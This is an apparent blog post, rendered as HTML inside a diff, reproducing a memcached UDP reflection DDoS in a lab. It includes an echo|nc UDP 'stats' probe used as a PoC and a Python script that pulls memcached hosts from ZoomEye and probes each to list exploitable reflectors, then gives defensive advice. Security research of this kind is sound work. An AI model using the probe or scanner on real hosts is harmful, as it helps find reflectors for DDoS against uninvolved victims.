@@ -1,0 +1,1281 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="memcached,web,vulnerability,DDoS" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="Memcached 简介 Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。     具体的命令使用方法，可以在这里看到，非常简单，很容易学习上手。">
+<meta name="keywords" content="memcached,web,vulnerability,DDoS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Memcached UDP DDoS利用复现">
+<meta property="og:url" content="http://yoursite.com/blog/memcached-ddos/index.html">
+<meta property="og:site_name" content="empty_xl Blog">
+<meta property="og:description" content="Memcached 简介 Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。     具体的命令使用方法，可以在这里看到，非常简单，很容易学习上手。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/mem.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/udp1.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/payload.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/evil5.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/reflect.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/send_udp.png">
+<meta property="og:image" content="http://yoursite.com/blog/memcached-ddos/receive.png">
+<meta property="og:updated_time" content="2018-07-22T11:43:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Memcached UDP DDoS利用复现">
+<meta name="twitter:description" content="Memcached 简介 Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。     具体的命令使用方法，可以在这里看到，非常简单，很容易学习上手。">
+<meta name="twitter:image" content="http://yoursite.com/blog/memcached-ddos/mem.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QT63IJTEZX',
+      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
+      indexName: 'emptyxl.github.io',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/blog/memcached-ddos/"/>
+
+
+
+
+
+  <title>Memcached UDP DDoS利用复现 | empty_xl Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-90390918-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">empty_xl Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Hello World！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/memcached-ddos/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="empty_xl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="empty_xl Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Memcached UDP DDoS利用复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-19T15:14:25+08:00">
+                2018-04-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-07-22T19:43:08+08:00">
+                2018-07-22
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Memcached/" itemprop="url" rel="index">
+                    <span itemprop="name">Memcached</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Memcached/vulnerability/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnerability</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Memcached/vulnerability/DDoS/" itemprop="url" rel="index">
+                    <span itemprop="name">DDoS</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Memcached-简介"><a href="#Memcached-简介" class="headerlink" title="Memcached 简介"></a>Memcached 简介</h3><blockquote>
+<p>Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。<br>它是一个简洁的key-value存储系统。<br>一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。</p>
+</blockquote>
+<img src="/blog/memcached-ddos/mem.png" alt="memcached flow" title="memcached flow">  
+<p>具体的命令使用方法，可以在<a href="http://www.runoob.com/Memcached/Memcached-tutorial.html" target="_blank" rel="external">这里</a>看到，非常简单，很容易学习上手。</p>
+<h3 id="UDP-Reflection-DDoS"><a href="#UDP-Reflection-DDoS" class="headerlink" title="UDP Reflection DDoS"></a>UDP Reflection DDoS</h3><p>memcached作为中间件，在之前爆出过整数溢出漏洞，详情可以看另一篇文章，而在最近，由于其低版本默认支持UDP协议，加上默认连接方式不需要认证，使得其可以通过利用，造成<code>UDP Reflection DDoS</code>，这里对其利用方式进行了复现。</p>
+<p>这里总共有3台机子:</p>
+<ul>
+<li>memcached服务器 IP:<code>192.168.1.100</code></li>
+<li>正常用户 IP:<code>192.168.1.101</code></li>
+<li>攻击者 IP:<code>192.168.1.103</code></li>
+</ul>
+<p>其利用的主要流程如下:  </p>
+<ol>
+<li><code>memcached</code> 默认连接不需要身份认证，这成为了利用的潜在条件</li>
+<li><code>memcached</code> 低版本默认支持UDP协议，这成为了UDP DDoS的条件</li>
+<li>在<code>memcached</code>中存储一个<code>key</code>字段很小，但<code>value</code>值很长的键值对，这提供了反射DDoS的可能</li>
+</ol>
+<a id="more"></a>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>首先是服务器开启<code>memcached</code>并支持UDP协议，根据<a href="https://github.com/memcached/memcached/wiki/ConfiguringServer#udp" target="_blank" rel="external">ConfiguringServer</a>的说明,默认是开启的:</p>
+<blockquote>
+<p>UDP<br><code>-U</code>modifies the UDP port, defaulting to on. UDP is useful for fetching or setting small items, not as useful for manipulating large items. Setting this to 0 will disable it, if you’re worried.</p>
+</blockquote>
+<p>而由于<code>memcached</code> <code>value</code>值默认上线是1M，我们改为10M:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memcached -u root -U <span class="number">11211</span> -I <span class="number">102400</span> -d</div></pre></td></tr></table></figure>
+<img src="/blog/memcached-ddos/udp1.png" alt="start memcached" title="start memcached">  
+<p>我们来测试下UDP连接是否可以,由官方手册可以看到，<code>memcached</code>自用协议使用UDP时需要加一个自定义的<code>UDP header</code>，具体参数如下,来源于<a href="https://github.com/memcached/memcached/blob/master/doc/protocol.txt" target="_blank" rel="external">这里</a>：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">UDP protocol</div><div class="line"><span class="comment">------------</span></div><div class="line"></div><div class="line">For very large installations <span class="keyword">where</span> <span class="keyword">the</span> <span class="built_in">number</span> <span class="keyword">of</span> clients <span class="keyword">is</span> high enough</div><div class="line"><span class="keyword">that</span> <span class="keyword">the</span> <span class="built_in">number</span> <span class="keyword">of</span> TCP connections causes scaling difficulties, there <span class="keyword">is</span></div><div class="line">also a UDP-based interface. The UDP interface <span class="keyword">does</span> <span class="keyword">not</span> provide guaranteed</div><div class="line">delivery, so should only be used <span class="keyword">for</span> operations <span class="keyword">that</span> aren't required <span class="keyword">to</span></div><div class="line">succeed; typically <span class="keyword">it</span> <span class="keyword">is</span> used <span class="keyword">for</span> <span class="string">"get"</span> requests <span class="keyword">where</span> a missing <span class="keyword">or</span></div><div class="line">incomplete response can simply be treated <span class="keyword">as</span> a cache miss.</div><div class="line"></div><div class="line">Each UDP datagram <span class="keyword">contains</span> a simple frame header, followed <span class="keyword">by</span> data <span class="keyword">in</span> <span class="keyword">the</span></div><div class="line">same format <span class="keyword">as</span> <span class="keyword">the</span> TCP protocol described <span class="keyword">above</span>. In <span class="keyword">the</span> current</div><div class="line">implementation, requests must be contained <span class="keyword">in</span> a single UDP datagram, <span class="keyword">but</span></div><div class="line">responses may span several datagrams. (The only common requests <span class="keyword">that</span> would</div><div class="line">span multiple datagrams are huge multi-key <span class="string">"get"</span> requests <span class="keyword">and</span> <span class="string">"set"</span></div><div class="line">requests, both <span class="keyword">of</span> which are more suitable <span class="keyword">to</span> TCP transport <span class="keyword">for</span> reliability</div><div class="line">reasons anyway.)</div><div class="line"></div><div class="line">The frame header <span class="keyword">is</span> <span class="number">8</span> bytes long, <span class="keyword">as</span> follows (all values are <span class="number">16</span>-bit integers</div><div class="line"><span class="keyword">in</span> network byte order, high byte <span class="keyword">first</span>):</div><div class="line"></div><div class="line"><span class="number">0</span><span class="number">-1</span> Request ID</div><div class="line"><span class="number">2</span><span class="number">-3</span> Sequence <span class="built_in">number</span></div><div class="line"><span class="number">4</span><span class="number">-5</span> Total <span class="built_in">number</span> <span class="keyword">of</span> datagrams <span class="keyword">in</span> this message</div><div class="line"><span class="number">6</span><span class="number">-7</span> Reserved <span class="keyword">for</span> future use; must be <span class="number">0</span></div><div class="line"></div><div class="line">The request ID <span class="keyword">is</span> supplied <span class="keyword">by</span> <span class="keyword">the</span> client. Typically <span class="keyword">it</span> will be a</div><div class="line">monotonically increasing value starting <span class="keyword">from</span> a random seed, <span class="keyword">but</span> <span class="keyword">the</span> client</div><div class="line"><span class="keyword">is</span> free <span class="keyword">to</span> use whatever request IDs <span class="keyword">it</span> likes. The server's response will</div><div class="line"><span class="keyword">contain</span> <span class="keyword">the</span> same ID <span class="keyword">as</span> <span class="keyword">the</span> incoming request. The client uses <span class="keyword">the</span> request ID</div><div class="line"><span class="keyword">to</span> differentiate <span class="keyword">between</span> responses <span class="keyword">to</span> outstanding requests <span class="keyword">if</span> there are</div><div class="line">several pending <span class="keyword">from</span> <span class="keyword">the</span> same server; any datagrams <span class="keyword">with</span> an unknown request</div><div class="line">ID are probably delayed responses <span class="keyword">to</span> an earlier request <span class="keyword">and</span> should be</div><div class="line">discarded.</div><div class="line"></div><div class="line">The sequence <span class="built_in">number</span> ranges <span class="keyword">from</span> <span class="number">0</span> <span class="keyword">to</span> n<span class="number">-1</span>, <span class="keyword">where</span> n <span class="keyword">is</span> <span class="keyword">the</span> total <span class="built_in">number</span> <span class="keyword">of</span></div><div class="line">datagrams <span class="keyword">in</span> <span class="keyword">the</span> message. The client should concatenate <span class="keyword">the</span> payloads <span class="keyword">of</span> <span class="keyword">the</span></div><div class="line">datagrams <span class="keyword">for</span> a <span class="keyword">given</span> response <span class="keyword">in</span> sequence <span class="built_in">number</span> order; <span class="keyword">the</span> resulting byte</div><div class="line">stream will <span class="keyword">contain</span> a complete response <span class="keyword">in</span> <span class="keyword">the</span> same format <span class="keyword">as</span> <span class="keyword">the</span> TCP</div><div class="line">protocol (including terminating \r\n sequences).</div></pre></td></tr></table></figure>
+<p>我们可以看到，需要加一个8bit的头部，由于我们只用发一条命令，所以4-5bit值为<code>001</code>其余均为<code>0</code>,使用通用命令<code>stats</code>，最终构造的payload:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -en "<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00stats<span class="symbol">\r</span><span class="symbol">\n</span>" |nc -u 192.168.1.100 11211</div></pre></td></tr></table></figure>
+<p>其中<code>echo -n</code>是不换行,<code>echo -e</code>是使用特殊字符,这也是这个漏洞的通用<code>POC</code>:</p>
+<img src="/blog/memcached-ddos/payload.png" alt="poc" title="poc">  
+<p>可以看到返回信息，说明此服务器可以利用。</p>
+<p>那攻击者就可以连接此<code>memcached</code>服务器，给一个key设置一个很大的值，然后利用其udp反射造成DDoS。</p>
+<p>给字段写入大量内容：<br><img src="/blog/memcached-ddos/evil5.png" alt="给字段写入大内容" title="给字段写入大内容"> </p>
+<p>使用UDP去请求字段,可以看到返回内容非常多:<br><img src="/blog/memcached-ddos/reflect.png" alt="udp" title="udp"> </p>
+<p>构造恶意数据包，指向正常用户源:</p>
+<img src="/blog/memcached-ddos/send_udp.png" alt="send udp" title="send udp"> 
+<p>在用户端检测到了UDP反射的大量数据包，完成DDoS攻击：<br><img src="/blog/memcached-ddos/receive.png" alt="DDoS" title="DDoS"> </p>
+<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>使用<code>zoomeye</code>去扫描使用<code>memcached</code>组件的ip地址，然后使用poc去扫描，观察输出，如果有输出，则为可以利用的主机。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -en "<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00stats<span class="symbol">\r</span><span class="symbol">\n</span>" |nc -u ipaddr 11211</div></pre></td></tr></table></figure>
+<p>附上一个自己写的从<code>zoomeye</code>获取漏洞主机的代码.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;<span class="string">"username"</span>: <span class="string">"username"</span>, <span class="string">"password"</span>: <span class="string">"password"</span>&#125;</div><div class="line">    r = requests.post(<span class="string">'https://api.zoomeye.org/user/login'</span>, json=data)</div><div class="line">    <span class="keyword">return</span> json.loads(r.text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(recv)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> len(recv[<span class="number">0</span>].res) &gt; <span class="number">0</span>:</div><div class="line">        content = (recv[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>].original).decode(<span class="string">'latin1'</span>)</div><div class="line">        pattern = re.compile(<span class="string">'(STAT|pid|uptime)'</span>)</div><div class="line">        match = re.search(pattern, content)</div><div class="line">        <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    token = login()</div><div class="line">    headers = &#123;<span class="string">'Authorization'</span>: <span class="string">'JWT '</span> + token[<span class="string">'access_token'</span>]&#125;</div><div class="line">    base_url = <span class="string">'https://api.zoomeye.org/host/search?query=app:memcached%20%2Bcountry:"CN"&amp;page='</span></div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'mem-res.txt'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> fw:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">            r = requests.get(url=base_url + str(i), headers=headers)</div><div class="line">            res = json.loads(r.text)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> res[<span class="string">'matches'</span>]:</div><div class="line">                    ip_addr = x[<span class="string">'ip'</span>].strip()</div><div class="line">                    ip_pkt = IP(dst=ip_addr)</div><div class="line">                    udp_pkt = UDP(</div><div class="line">                        dport=<span class="number">11211</span>, sport=random.randint(<span class="number">1025</span>, <span class="number">65535</span>))</div><div class="line">                    payload = <span class="string">'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'</span></div><div class="line"></div><div class="line">                    pkt = ip_pkt / udp_pkt / payload</div><div class="line">                    recv = sr(pkt, timeout=<span class="number">5</span>)</div><div class="line"></div><div class="line">                    <span class="keyword">if</span> verify(recv):</div><div class="line">                        fw.write(ip_addr + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                print(e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>使用最新版<code>memcached</code></li>
+<li>绑定监听IP，使用IP白名单或绑定本地回路</li>
+<li>使用最小权限运行<code>memcached</code></li>
+<li>修改默认端口</li>
+<li>启用<code>SASL</code>认证</li>
+<li>关闭UDP协议支持</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    empty_xl
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/blog/memcached-ddos/" title="Memcached UDP DDoS利用复现">http://yoursite.com/blog/memcached-ddos/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/Memcached/" rel="tag"><i class="fa fa-tag"></i> Memcached</a>
+          
+            <a href="/tags/vulnerability/" rel="tag"><i class="fa fa-tag"></i> vulnerability</a>
+          
+            <a href="/tags/DDoS/" rel="tag"><i class="fa fa-tag"></i> DDoS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/php-deserialization/" rel="next" title="PHP反序列化相关漏洞总结[CVE-2016-7124、SugarCRM、session 反序列化、HITCON 2016]">
+                <i class="fa fa-chevron-left"></i> PHP反序列化相关漏洞总结[CVE-2016-7124、SugarCRM、session 反序列化、HITCON 2016]
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/redis-unauthorized-vulnerability/" rel="prev" title="Redis 未授权访问漏洞利用分析">
+                Redis 未授权访问漏洞利用分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+    var gitment = new Gitment({
+      // 根据文章标题设置唯一评论id
+    // id: '', // optional
+    owner: 'emptyxl',
+    repo: 'emptyxl.github.io',
+    oauth: {
+      client_id: 'fa7413e3c0207a96ae03',
+      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
+      }
+    })
+    gitment.render('comments')
+    </script>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="empty_xl" />
+          <p class="site-author-name" itemprop="name">empty_xl</p>
+           
+              <p class="site-description motion-element" itemprop="description">hello world!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
